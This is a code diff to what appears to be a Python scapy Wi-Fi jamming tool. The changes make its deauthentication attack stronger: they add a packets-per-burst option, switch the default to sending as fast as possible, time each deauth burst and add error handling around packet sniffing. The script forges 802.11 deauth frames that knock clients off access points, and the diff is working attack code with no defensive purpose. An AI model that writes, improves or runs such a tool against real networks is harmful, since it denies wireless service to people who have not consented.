@@ -30,7 +30,8 @@ def parse_args():
     parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
     parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
     parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
-    parser.add_argument("-t", "--timeinterval", help="Choose the time interval in seconds for sending out deauths. By default it's 1 second. Send deauths every half second: -t .5")
+    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
+    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
     return parser.parse_args()
 
 
@@ -137,6 +138,7 @@ def deauth():
     multi-APs to one gateway. Constantly scans the clients_APs list and
     starts a thread to deauth each instance
     '''
+    global timer, timer2
     pkts = []
     while 1:
         if len(clients_APs) > 0:
@@ -153,13 +155,19 @@ def deauth():
                     deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                     pkts.append(deauth_pkt2)
             if len(pkts) > 0:
+                with lock:
+                    timer = time.time()
+
+                if not args.timeinterval:
+                    args.timeinterval = 0
+                if not args.packets:
+                    args.packets = 1
+
                 for pkt in pkts:
+                    send(pkt, inter=float(args.timeinterval), count=int(args.packets))
                     # prevent 'no buffer space' error http://goo.gl/6YuJbI
-                    send(pkt, inter=.00001) #####################3####################3
-        if args.timeinterval:
-            time.sleep(float(args.timeinterval))
-        else:
-            time.sleep(1)
+                with lock:
+                    timer2 = time.time()
 
 def channel_hop(mon_iface, args):
     channelNum = 0
@@ -253,7 +261,8 @@ def clients_APs_add(clients_APs, pkt):
                 return clients_APs.append([pkt.addr1, pkt.addr2])
 
 def output(err, monchannel):
-    global ap_update, clients_APs
+    global ap_update, clients_APs, timer, timer2
+
     ap_update += 1
     os.system('clear')
     if err:
@@ -265,7 +274,7 @@ def output(err, monchannel):
     # Update the deauth list with channel and ESSID every 5 seconds
     # Updating requires a costly thread-shared object lock
     # So we don't want to do it too often
-    if ap_update % 4 == 0:
+    if ap_update % 5 == 0:
         clients_APs = updated()
 
     with lock:
@@ -274,6 +283,10 @@ def output(err, monchannel):
                 print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W
             else:
                 print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W
+    with lock:
+        if timer != 0 and timer2 != 0:
+            if timer > timer2:
+                print '['+G+'*'+W+'] Took'+G,(timer-timer2), W+'seconds to send last deauth burst'
 
 def updated():
     new_clients_APs = []
@@ -305,6 +318,8 @@ if __name__ == "__main__":
     mon_iface = get_mon_iface(args)
     conf.iface = mon_iface
     mon_MAC = mon_mac(mon_iface)
+    timer = 0
+    timer2 = 0
 
     # Start channel hopping
     hop = Thread(target=channel_hop, args=(mon_iface, args))
@@ -317,8 +332,8 @@ if __name__ == "__main__":
     d.start()
 
     signal(SIGINT, stop)
-    sniff(iface=mon_iface, store=0, prn=cb)
-#    try:
-#    except Exception as msg:
-#        print '\n['+R+'!'+W+'] Closing:', msg
-#        sys.exit(0)
+    try:
+       sniff(iface=mon_iface, store=0, prn=cb)
+    except Exception as msg:
+        print '\n['+R+'!'+W+'] Closing:', msg
+        sys.exit(0)
